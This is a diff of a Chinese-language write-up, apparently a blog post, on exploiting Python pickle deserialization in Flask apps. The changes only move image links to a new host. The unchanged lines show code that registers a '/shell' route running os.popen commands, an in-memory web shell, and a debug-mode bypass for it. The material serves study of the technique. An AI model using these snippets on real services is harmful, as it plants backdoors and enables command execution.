@@ -88,7 +88,7 @@ lo.''' % (exc)
 print(quote(b64encode(opcode).decode()))
 ```
 
-![](https://gitee.com/guuest/images/raw/master/img/20211024113458.png)
+![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211024113458.png)
 
 可以看到我们成功通过Exception去拿到了回显
 
@@ -111,7 +111,7 @@ print(id(app1))
 print(id(app2))
 ```
 
-![](https://gitee.com/guuest/images/raw/master/img/20211024114600.png)
+![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211024114600.png)
 
 可以看到app的id并不相同，所以他们并非相同的app
 
@@ -122,7 +122,7 @@ import os
 sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :os.popen('dir').read())
 ```
 
-![](https://gitee.com/guuest/images/raw/master/img/20211024114744.png)
+![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211024114744.png)
 
 这个报错是由于我们在第一个请求处理后调用了设置函数(add_url_rule)，此报错只会在debug模式下触发，可以参考使用了Flask框架的工具的issue:
 - https://github.com/alexmclarty/mirror/issues/6
@@ -135,4 +135,4 @@ sys.modules['__main__'].__dict__['app'].debug=False
 sys.modules['__main__'].__dict__['app'].add_url_rule('/shell','shell',lambda :__import__('os').popen('dir').read())
 ```
 
-![](https://gitee.com/guuest/images/raw/master/img/20211024115906.png)
+![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211024115906.png)
